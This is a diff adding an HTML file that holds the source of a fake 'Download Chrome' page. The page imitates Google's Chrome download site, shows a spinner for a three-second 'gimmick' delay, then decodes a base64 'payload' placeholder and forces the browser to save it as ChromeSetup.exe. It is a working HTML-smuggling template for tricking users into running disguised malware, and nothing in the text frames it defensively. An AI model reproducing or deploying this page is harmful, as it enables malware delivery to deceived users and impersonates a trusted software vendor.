@@ -1,0 +1,68 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+  <meta http-equiv="Content-Style-Type" content="text/css">
+  <title></title>
+  <meta name="Generator" content="Cocoa HTML Writer">
+  <meta name="CocoaVersion" content="2487.6">
+  <style type="text/css">
+    p.p1 {margin: 0.0px 0.0px 0.0px 0.0px; font: 12.0px Helvetica}
+    p.p2 {margin: 0.0px 0.0px 0.0px 0.0px; font: 12.0px Helvetica; min-height: 14.0px}
+  </style>
+</head>
+<body>
+<p class="p1">&lt;!DOCTYPE html&gt;</p>
+<p class="p1">&lt;html&gt;</p>
+<p class="p1">&lt;head&gt;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;title&gt;Download Chrome&lt;/title&gt;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;style&gt;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background-color: #f1f1f1; }</p>
+<p class="p1"><span class="Apple-converted-space">        </span>.container { max-width: 600px; margin: auto; background: white; padding: 20px; box-shadow: 0 0 10px rgba(0,0,0,0.1); border-radius: 10px; }</p>
+<p class="p1"><span class="Apple-converted-space">        </span>.btn { background-color: #4285f4; color: white; padding: 15px 25px; font-size: 18px; border: none; cursor: pointer; border-radius: 5px; transition: background-color 0.3s; }</p>
+<p class="p1"><span class="Apple-converted-space">        </span>.btn:hover { background-color: #357ae8; }</p>
+<p class="p1"><span class="Apple-converted-space">        </span>.btn:active { background-color: #2b5cb7; }</p>
+<p class="p1"><span class="Apple-converted-space">        </span>.loader { border: 8px solid #f3f3f3; border-top: 8px solid #4285f4; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; display: none; margin: 20px auto; }</p>
+<p class="p1"><span class="Apple-converted-space">        </span>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;/style&gt;</p>
+<p class="p1">&lt;/head&gt;</p>
+<p class="p1">&lt;body&gt;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;div class="container"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>&lt;h1&gt;Get Chrome&lt;/h1&gt;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>&lt;p&gt;Download the fast, secure browser recommended by Google.&lt;/p&gt;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>&lt;button class="btn" onclick="startDownload()"&gt;Download Chrome&lt;/button&gt;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>&lt;div class="loader" id="loader"&gt;&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;/div&gt;</p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;script&gt;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>var fileData = 'BASE64_ENCODED_STRING'; // Replace with your base64 encoded payload</p>
+<p class="p1"><span class="Apple-converted-space">        </span>var fileName = 'ChromeSetup.exe';</p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">        </span>function startDownload() {</p>
+<p class="p1"><span class="Apple-converted-space">            </span>document.getElementById('loader').style.display = 'block';</p>
+<p class="p1"><span class="Apple-converted-space">            </span>setTimeout(downloadPayload, 3000); // Add a 3-second delay for the gimmick effect</p>
+<p class="p1"><span class="Apple-converted-space">        </span>}</p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">        </span>function downloadPayload() {</p>
+<p class="p1"><span class="Apple-converted-space">            </span>var binary = atob(fileData);</p>
+<p class="p1"><span class="Apple-converted-space">            </span>var len = binary.length;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>var buffer = new Uint8Array(len);</p>
+<p class="p1"><span class="Apple-converted-space">            </span>for (var i = 0; i &lt; len; i++) {</p>
+<p class="p1"><span class="Apple-converted-space">                </span>buffer[i] = binary.charCodeAt(i);</p>
+<p class="p1"><span class="Apple-converted-space">            </span>}</p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">            </span>var blob = new Blob([buffer], { type: 'application/octet-stream' });</p>
+<p class="p1"><span class="Apple-converted-space">            </span>var url = window.URL.createObjectURL(blob);</p>
+<p class="p1"><span class="Apple-converted-space">            </span>var a = document.createElement('a');</p>
+<p class="p1"><span class="Apple-converted-space">            </span>a.href = url;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>a.download = fileName;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>document.body.appendChild(a);</p>
+<p class="p1"><span class="Apple-converted-space">            </span>a.click();</p>
+<p class="p1"><span class="Apple-converted-space">            </span>window.URL.revokeObjectURL(url);</p>
+<p class="p1"><span class="Apple-converted-space">            </span>document.getElementById('loader').style.display = 'none';</p>
+<p class="p1"><span class="Apple-converted-space">        </span>}</p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;/script&gt;</p>
+<p class="p1">&lt;/body&gt;</p>
+<p class="p1">&lt;/html&gt;</p>
+</body>
+</html>
